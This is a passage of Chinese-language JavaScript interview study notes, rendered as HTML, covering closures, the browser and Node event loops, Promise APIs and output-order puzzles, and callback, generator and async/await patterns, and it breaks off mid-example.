class="line">A()</span><br><span class="line">B() <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>闭包的<strong>用途</strong>：</p><ul><li><strong>模拟创建私有变量</strong>（只有类内部能够访问，而无法被外部类访问）。<code>JavaScript</code>并未原生支持定义私有成员，但是可以使用闭包来模拟实现。</li><li>使已经运行结束的函数上下文中的<strong>变量对象继续留在内存</strong>中。因为闭包函数保留了这个变量对象的引用，所以不会被回收。（延续变量作用域）</li><li>为<strong>回调机制</strong>提供了支持。</li><li>模拟<strong>块级作用域</strong>。</li><li>创建模块。</li></ul><p>闭包的<strong>缺点</strong>：会导致函数的变量一直保存在内存中，过多的闭包可能会导致<strong>内存泄漏</strong>。解决方法：退出函数前将不使用的局部变量全部删除。</p><p><strong>如何释放</strong>：当闭包函数不被引用时，就会释放内存，即将该函数设为 null 。</p><p>闭包的<strong>变量如何存储</strong>：存在堆中。</p><p>例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i++);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f1 = Foo(), f2 = Foo();</span><br><span class="line">f1();</span><br><span class="line">f1();</span><br><span class="line">f2();</span><br></pre></td></tr></table></figure><p>Foo() 返回了一个匿名函数的引用（闭包），可以访问到 Foo() 被调用产生的环境，而局部变量 i 一直处在这个环境中，只要一个环境有可能被访问到，它就不会被销毁。所以说<strong>闭包有延续变量作用域的功能</strong>，前两次输出 0 1。</p><p>Foo() 返回的是一个匿名函数，所以 f1，f2 相当于指向了两个不同的函数对象，最后输出 0。</p><h3 id="在实际项目中遇到过哪些闭包的坑"><a href="#在实际项目中遇到过哪些闭包的坑" class="headerlink" title="在实际项目中遇到过哪些闭包的坑"></a>在实际项目中遇到过哪些闭包的坑</h3><p>参考自 <a href="https://blog.csdn.net/likyqp/article/details/94721177">https://blog.csdn.net/likyqp/article/details/94721177</a></p><p>坑一：内存泄漏。比如要为某个元素添加onclick事件的时候。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showId</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> el = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    el.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(el.id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样写el.id会造成函数运行完后，JS的垃圾回收机制无法回收el，造成内存泄漏。为了避免它，最好改成这样写：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showId</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> el = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> id = el.id;</span><br><span class="line">    el.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(id); <span class="comment">//这样写会导致id去访问外部函数作用域的id，造成内存泄漏</span></span><br><span class="line">    &#125;</span><br><span class="line">    el = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模仿块级作用域</p><h2 id="js-的事件循环（Event-Loop）？（高频）"><a href="#js-的事件循环（Event-Loop）？（高频）" class="headerlink" title="js 的事件循环（Event Loop）？（高频）"></a>js 的事件循环（Event Loop）？（高频）</h2><p>不同的任务源会被分配到不同的 Task 队列中，任务源可以分为 <strong>微任务</strong>（microtask） 和 <strong>宏任务</strong>（macrotask）。在 ES6 规范中，microtask 称为 <code>jobs</code>，macrotask 称为 <code>task</code>。有关宏任务、微任务具体见<a href="https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/">tasks-microtasks-queues-and-schedules</a>。</p><p><a href="https://juejin.cn/post/6844903512845860872#heading-4">这一次，彻底弄懂 JavaScript 执行机制</a></p><p><strong>执行栈：</strong>一个存储函数调用的<strong>栈结构</strong>，遵循先进后出的原则。当开始执行 JS 代码时，首先会执行 <code>main</code> 函数，然后执行代码。根据先进后出的原则，后执行的函数会先弹出栈。</p><p> js 是单线程运行的，通过将不同函数的执行上下文压入执行栈来保证代码的有序执行。在执行同步代码的时候，如果遇到<strong>异步</strong>事件，js 引擎并不会一直等待其返回结果，而是将这个事件挂起，继续执行执行栈中的其他任务；当异步事件执行完毕后，再<strong>将异步事件对应的回调加入到与当前执行栈不同的另一个任务队列中</strong>等待执行。</p><p>当前执行栈中的事件执行完毕后，js 引擎首先会判断微任务队列中是否有任务可以执行，如果有就将微任务队首的事件压入栈中执行。当微任务队列中的任务都执行完成后再判断宏任务队列中的任务。</p><p><strong>微任务</strong>： <code>process.nextTick</code>（Node 独有） ，<code>promise</code> 的回调（async/await），对 Dom 变化监听的<code>MutationObserver</code>（ H5 新增）。</p><p><strong>宏任务</strong>： <code>script</code> 脚本的执行，<code>setTimeout </code>，<code>setInterval</code> ，<code>setImmediate</code> 一类的定时事件，还有如 <code>I/O</code> 操作、<code>UI rendering</code>等。</p><p><img src="https://i.loli.net/2021/09/11/H3nSo9t6erYCmMA.png" alt="image.png"></p><p>Event Loop <strong>执行顺序</strong>如下所示：</p><ol><li>首先执行同步代码，这属于宏任务</li><li>执行完后，执行栈为空，查询是否有异步代码需要执行</li><li>执行所有微任务</li><li>当执行完所有微任务后，如有必要会<strong>渲染页面</strong>。（为了能够使得<strong>JS引擎线程</strong>与<strong>GUI渲染线程</strong>有序切换）</li><li>然后开始下一轮 Event Loop，执行宏任务中的异步代码，也就是 <code>setTimeout</code> 中的回调函数</li></ol><p>浏览器页面初次渲染完毕后，JS 引擎线程结合事件触发线程的工作流程如下：</p><ol><li>同步任务在 JS 引擎线程（主线程）上执行，形成执行栈。</li><li>主线程之外，事件触发线程管理着一个任务队列。只要异步任务有了运行结果，就在任务队列之中放置一个事件。</li><li>执行栈中的同步任务执行完毕，系统就会读取任务队列，如果有异步任务需要执行，将其加到主线程的执行栈并执行相应的异步任务。</li></ol><h3 id="process-nextTick-执行顺序？"><a href="#process-nextTick-执行顺序？" class="headerlink" title="process.nextTick 执行顺序？"></a>process.nextTick 执行顺序？</h3><p>这个函数其实是独立于 Event Loop 之外的，它有一个自己的队列。当每个阶段完成后，如果存在 nextTick 队列，就会<strong>清空队列中的所有回调函数</strong>，并且优先于其他 microtask 执行。</p><h3 id="JS-为什么单线程？与异步冲突吗？（高频）"><a href="#JS-为什么单线程？与异步冲突吗？（高频）" class="headerlink" title="JS 为什么单线程？与异步冲突吗？（高频）"></a>JS 为什么单线程？与异步冲突吗？（高频）</h3><p>作为浏览器脚本语言，JavaScript 的主要用途是与用户互动以及操作DOM。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，假定 JavaScript 同时有两个线程，一个线程在某个DOM节点上添加内容，另一个线程删除了这个节点，就会造成混乱。</p><p>JS 的单线程是指一个浏览器进程中只有一个 JS 的执行线程，同一时刻内只会有一段代码在执行。</p><p>异步机制是浏览器的两个或以上常驻线程共同完成的，比如异步请求由JS执行线程和事件触发线程共同完成：</p><ul><li><strong>JS 执行线程</strong>发起异步请求（浏览器会开启一个 HTTP 请求线程来执行请求，这时 JS 的任务完成，继续执行线程队列中剩下任务）</li><li>在某一时刻<strong>事件触发线程</strong>监视到之前发起的 HTTP 请求已完成，就会把完成事件插入到 JS 执行队列的尾部等待 JS 处理</li></ul><p>所以 JS 单线程与异步更多是浏览器行为，不冲突。</p><h3 id="Node-中的-Event-Loop-和浏览器中的有什么区别？"><a href="#Node-中的-Event-Loop-和浏览器中的有什么区别？" class="headerlink" title="*Node 中的 Event Loop 和浏览器中的有什么区别？"></a>*Node 中的 Event Loop 和浏览器中的有什么区别？</h3><p>部分参考自 <a href="https://i-want-offer.github.io/FE-Essay/JavaScript/%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF.html">https://i-want-offer.github.io/FE-Essay/JavaScript/%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF.html</a></p><p>Node 的 Event Loop 分为 6 个阶段，它们会按照<strong>顺序</strong>反复运行。每当进入某一个阶段的时候，都会从对应的回调队列中取出函数去执行。当队列为空或者执行的回调函数数量到达系统设定的阈值，就会进入下一阶段。</p><p><img src="https://i.loli.net/2021/09/11/cyIsZ8k7fXYT2eD.png" alt="image.png"></p><p>上图可以简化为以下流程：</p><ol><li>输入数据阶段（incoming data）</li><li>轮询阶段（poll）</li><li>检查阶段（check）</li><li>关闭时间回调阶段（close callback）</li><li>定时器检测阶段（timers）</li><li>I / O 事件回调阶段（I / O callbacks）</li><li>闲置阶段（idle，prepare）</li><li>轮询阶段…</li></ol><p>日常开发中绝大部分异步任务都在 poll、check、timers 这三个阶段处理</p><ul><li>timers 阶段：执行 <code>setTimeout</code> 和 <code>setInterval</code> 回调，并且是由 poll 阶段控制的。同样，在 Node 中定时器指定的时间也不是准确时间，只能是<strong>尽快</strong>执行。</li><li>I/O 阶段：执行延迟到下一个循环迭代的 I / O 回调，即上一轮循环中未被执行的一些 I / O 回调</li><li>闲置阶段（idle，prepare）：仅供内部使用</li><li>poll ：一个至关重要的阶段，这一阶段中系统会做两件事情<ul><li>回到 timer 阶段执行回调</li><li>执行 I/O 回调</li></ul></li><li>check 阶段：执行 <code>setImmediate</code></li><li>close callbacks 阶段：执行 close 事件</li></ul><h2 id="Promise-相关（高频）"><a href="#Promise-相关（高频）" class="headerlink" title="Promise 相关（高频）"></a>Promise 相关（高频）</h2><p>部分参考自 <a href="https://juejin.cn/post/6844903625609707534">面试精选之Promise</a></p><h3 id="什么是-Promise-对象、Promises-A-规范？"><a href="#什么是-Promise-对象、Promises-A-规范？" class="headerlink" title="什么是 Promise 对象、Promises/A+ 规范？"></a>什么是 Promise 对象、Promises/A+ 规范？</h3><p>Promise 对象是异步编程的一种解决方案。Promises/A+ 规范是 JavaScript Promise 的标准，规定了一个 Promise 所必须具有的特性。</p><p>Promise 是一个构造函数（构造函数内部的代码是立即执行的），接收一个函数作为参数，返回一个 Promise 实例。一个 Promise 实例有三种状态，分别是 pending、resolved 和 rejected，代表进行中、已成功和已失败。实例的状态只能由 pending 转变 resolved 或者 rejected 状态，并且<strong>状态一经改变，就无法再被改变</strong>。状态是通过 resolve() 和 reject() 函数来实现改变的，可以在异步操作结束后调用这两个函数改变 Promise 实例的状态，它的原型上定义了一个 then 方法，使用它可以为两个状态的改变注册回调函数（微任务）。</p><h3 id="promise-相关-api-？（all-比较重要）"><a href="#promise-相关-api-？（all-比较重要）" class="headerlink" title="promise 相关 api ？（all 比较重要）"></a>promise 相关 api ？（all 比较重要）</h3><ol><li><p><code>Promise.prototype.then</code>：实例方法，为 Promise 注册回调函数。函数形式：<code>fn(vlaue)&#123;&#125;</code>，value 是上一个任务的返回结果，<strong>then 中的函数一定要 return 一个结果或者一个新的 Promise 对象</strong>，才可以让之后的then 回调接收。</p></li><li><p><code>Promise.prototype.catch</code>：实例方法，捕获异常。函数形式：<code>fn(err)&#123;&#125;</code>, err 是 catch 注册之前的回调抛出的异常信息。</p></li><li><p><code>Promise.prototype.finally</code>：实例方法，只在 Promise 状态是 settled 时才会调用。如果希望一段代码即使出现错误仍需要执行，那么可以在 .catch 之后使用 .then，或者使用 .finally 关键字。</p></li><li><p><code>Promise.resolve(value)</code> 类方法，返回一个以 value 值解析后的 <strong>Promise 对象</strong> </p><ul><li><p>如果这个值是个 thenable（即带有 then 方法，简单说是一个非常类似 Promise 的东西），返回的 Promise 对象会“跟随”这个 thenable 的对象，采用它的最终状态（指 resolved/rejected/pending/settled）</p></li><li><p>如果传入的 value 本身就是 Promise 对象，则该对象作为 Promise.resolve 方法的返回值返回。</p></li><li><p>其他情况以该值为成功状态返回一个 Promise 对象。</p></li></ul></li><li><p><code>Promise.reject(value)</code> 类方法，返回 promise 对象的状态为 rejected。</p></li><li><p><code>Promise.race()</code>：类方法，多个 Promise 任务同时执行，<strong>返回最先执行结束的 Promise 任务的结果</strong>，不管这个 Promise 结果是成功还是失败。 </p></li><li><p><strong><code>Promise.all()</code><strong>：类方法，多个 Promise 任务</strong>同时执行。</strong>如果全部成功执行，则以数组的方式返回所有 Promise 任务的执行结果（按输入顺序）。如果有一个 Promise 任务 rejected，则只返回 rejected 任务的结果。</p></li></ol><h3 id="自己项目中使用？（todo）"><a href="#自己项目中使用？（todo）" class="headerlink" title="自己项目中使用？（todo）"></a>自己项目中使用？（todo）</h3><h3 id="Promise-输出"><a href="#Promise-输出" class="headerlink" title="Promise 输出"></a>Promise 输出</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;start&#x27;</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;children2&#x27;</span>);</span><br><span class="line">    <span class="built_in">Promise</span>.resolve().then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;children3&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;children4&#x27;</span>);  <span class="comment">// 重点是 new Promise 里面的代码也是同步的</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        resolve(<span class="string">&#x27;children6&#x27;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;children5&#x27;</span>);  <span class="comment">// resolve 不会阻塞</span></span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">&#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;children7&#x27;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(res);</span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;end&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// start children4 end children2 children3  children5  children7 children6</span></span><br></pre></td></tr></table></figure><h2 id="异步编程？（高频）"><a href="#异步编程？（高频）" class="headerlink" title="异步编程？（高频）"></a>异步编程？（高频）</h2><p>js 中的异步机制分为以下几种：</p><ul><li><p>回调函数。<strong>优点</strong>是简单、容易理解和部署，<strong>缺点</strong>是不利于代码的阅读和维护，各个部分之间高度耦合，流程很混乱，不利于代码的维护。而且每个任务只能指定一个回调函数，多个回调函数嵌套会造成<strong>回调地狱</strong>。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 假定有两个函数f1和f2，后者等待前者的执行结果。</span></span><br><span class="line">f1();</span><br><span class="line">f2();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改写，把f2写成f1的回调函数。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params">callback</span>)</span>&#123;</span><br><span class="line">　　<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">　　　　<span class="comment">// f1代码</span></span><br><span class="line">　　　　callback();</span><br><span class="line">　　&#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line">f1(f2);</span><br></pre></td></tr></table></figure></li><li><p>事件监听。采用事件驱动模式，任务的执行不取决于代码的顺序，而取决于某个事件是否发生。<strong>优点</strong>是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以”去耦合”，有利于实现模块化。<strong>缺点</strong>是整个程序都要变成事件驱动型，运行流程会变得很不清晰。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 首先为f1绑定一个事件</span></span><br><span class="line">f1.on(<span class="string">&#x27;done&#x27;</span>, f2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改写，f1.trigger(&#x27;done&#x27;)表示执行完成后，立即触发done事件，从而开始执行f2。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">　　<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">　　　　<span class="comment">// f1代码</span></span><br><span class="line">　　　　f1.trigger(<span class="string">&#x27;done&#x27;</span>)</span><br><span class="line">　　&#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>发布/订阅。上述”事件”可以理解成”信号”：假定存在一个”信号中心”，某个任务执行完成，就向信号中心”发布”（publish）一个信号，其他任务可以向信号中心”订阅”（subscribe）信号，从而知道何时可以开始执行。这就叫“发布/订阅模式”，又称”观察者模式”。<strong>优点</strong>是可以通过查看”消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 首先，f2向&quot;信号中心&quot;jQuery订阅&quot;done&quot;信号。</span></span><br><span class="line">jQuery.subscribe(<span class="string">&quot;done&quot;</span>, f2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改写：jQuery.publish(&quot;done&quot;)的意思是，f1执行完成后，向&quot;信号中心&quot;jQuery发布&quot;done&quot;信号，从而引发f2的执行。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// f1代码</span></span><br><span class="line">jQuery.publish(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// f2完成执行后也可以取消订阅。</span></span><br><span class="line">jQuery.unsubscribe(<span class="string">&quot;done&quot;</span>, f2);</span><br></pre></td></tr></table></figure></li><li><p>Promise 。使用 Promise 的方式可以将嵌套的回调函数作为链式调用。但是使用这种方法，有时会造成多个 then 的链式调用，可能会造成代码的语义不够明确。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">f1();</span><br><span class="line">    resolve();</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    f2();</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    f3();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>generator。生成器函数就是一个带星号（*）的函数，在内部碰到 yield 可以实现暂停功能，使用 next 进行迭代。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">yield</span> <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">yield</span> <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;ending&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> gen = g();</span><br><span class="line"></span><br><span class="line"><span class="comment">// g()并不会立即执行函数，而是返回迭代器Iterator对象，必须调用遍历器对象的next方法，使得指针移向下一个状态。</span></span><br><span class="line"><span class="built_in">console</span>.log(gen.next());   <span class="comment">// &#123; value: &#x27;a&#x27;, done: false &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(gen.next());   <span class="comment">// &#123; value: &#x27;b&#x27;, done: false &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(gen.next());<span class="comment">// &#123; value: &#x27;ending&#x27;, done: true &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(gen.next());<span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure></li><li><p>async。async 函数是 generator 和 promise 的一个自动执行的语法糖，内部自带执行器。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> readFile = <span class="function"><span class="keyword">function</span> (<span class="params">fileName</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    fs.readFile(fileName, <span class="function"><span class="keyword">function</span>(<span class="params">error, data</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (error) <span class="keyword">return</span> reject(error);</span><br><span class="line">      resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> gen = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> f1 = <span class="keyword">yield</span> readFile(<span class="string">&#x27;/etc/fstab&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> f2 = <span class="keyword">yield</span> readFile(<span class="string">&#x27;/etc/shells&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(f1.toString());</span><br><span class="line">  <span class="built_in">console</span>.log(f2.toString());</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上面代码的函数gen可以写成async函数：</span></span><br><span class="line"><span class="keyword">const</span> asyncReadFile = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> f1 = <span class="keyword">await</span> readFile(<span class="string">&#x27;/etc/fstab&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> f2 = <span class="keyword">await</span> readFile(<span class="string">&#x27;/etc/shells&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(f1.toString());</span><br><span class="line">  <span class="built_in">console</span>.log(f2.toString());</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="回调地狱"><a href="#回调地狱" class="headerlink" title="回调地狱"></a>回调地狱</h3><p>回调函数的致命弱点：</p><ol><li>嵌套函数存在<strong>耦合</strong>性，一旦有所改动，就会牵一发而动全身</li><li>嵌套函数一多，就<strong>很难处理错误</strong></li><li>不能使用 <code>try catch</code> 捕获错误，不能直接 <code>return</code>。</li></ol><h3 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h3><p>Generator 函数是一个状态机，封装了多个内部状态。执行 Generator 函数会返回一个遍历器对象，可以依次遍历 Generator 函数内部的每一个状态，但是只有调用<code>next</code>方法才会遍历下一个内部状态，所以其实提供了一种<strong>可以暂停执行</strong>的函数。<code>yield</code>表达式就是暂停标志。</p><p>当遇到异步函数执行的时候，将函数执行权转移出去，异步函数执行完毕再将执行权转移回来，因此可以以同步的顺序来书写异步操作。这种方式需要考虑的是何时将函数的控制权转移回来，因此要有一个自动执行 generator 的机制，比如说 co 模块等方式来实现 generator 的自动执行。<a href="https://blog.csdn.net/a18792627168/article/details/106154898%E3%80%82">https://blog.csdn.net/a18792627168/article/details/106154898。</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">foo</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> y = <span class="number">2</span> * (<span class="keyword">yield</span> (x + <span class="number">1</span>))</span><br><span class="line">  <span class="keyword">let</span> z = <span class="keyword">yield</span> (y / <span class="number">3</span>)</span><br><span class="line">  <span class="keyword">return</span> (x + y + z)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> it = foo(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">console</span>.log(it.next())   <span class="comment">// =&gt; &#123;value: 6, done: false&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(it.next(<span class="number">12</span>)) <span class="comment">// =&gt; &#123;value: 8, done: false&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(it.next(<span class="number">13</span>)) <span class="comment">// =&gt; &#123;value: 42, done: true&#125;</span></span><br></pre></td></tr></table></figure><ul><li>首先 <code>Generator</code> 函数调用和普通函数不同，它会返回一个迭代器</li><li>当执行第一次 <code>next</code> 时，传参会被忽略，并且函数暂停在 <code>yield (x + 1)</code> 处，所以返回 <code>5 + 1 = 6</code></li><li>当执行第二次 <code>next</code> 时，传入的参数等于上一个 <code>yield</code> 的返回值，如果你不传参，<code>yield</code> 永远返回 <code>undefined</code>。此时 <code>let y = 2 * 12</code>，所以第二个 <code>yield</code> 等于 <code>2 * 12 / 3 = 8</code></li><li>当执行第三次 <code>next</code> 时，传入的参数会传递给 <code>z</code>，所以 <code>z = 13, x = 5, y = 24</code>，相加等于 <code>42</code></li></ul><p>Generator 函数被调用时并不会执行。每次调用遍历器对象的next方法，就会返回一个有着<code>value</code>和<code>done</code>两个属性的对象。<code>value</code>属性表示当前的内部状态的值，<code>done</code>属性表示是否遍历结束。</p><h3 id="async-await"><a href="#async-await" class="headerlink" title="async/await"></a>async/await</h3><p><strong>以同步方式执行异步操作。ES7</strong> 引入的 async  是一个通过异步执行并隐式返回 Promise 作为结果的函数。async 是将函数返回值使用 <code>Promise.resolve()</code> 包裹了下，<code>await</code> 是 <code>generator</code> 加上 <code>Promise</code> 的语法糖，且内部实现了自动执行 <code>generator</code>。</p><p>考虑以下情景：接口一，请求到数据一，而数据一被当做请求二的参数去请求数据二，用Promise实现：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 模拟第一次请求</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="number">5</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 模拟第二次请求</span></span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 拿第一次请求的数据去乘10，当做第二次请求的数据</span></span><br><span class="line">        resolve(res * <span class="number">10</span>)</span><br><span class="line">      &#125;, <span class="number">2000</span>)</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">sres</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(sres)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">fn() <span class="comment">// 3秒后输出 50</span></span><br></pre></td></tr></table></figure><p>async/await 实现，注意以下几点：</p><ul><li>await 只能在 async 函数里使用</li><li>await 后面最好接 Promise，<strong>如果后面接的是普通函数则会直接执行</strong></li><li>async 函数返回的是一个 Promise</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="number">5</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn2</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(data * <span class="number">10</span>)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 同步方式执行异步，像排队一样</span></span><br><span class="line">  <span class="keyword">const</span> data1 = <span class="keyword">await</span> fn1() <span class="comment">// 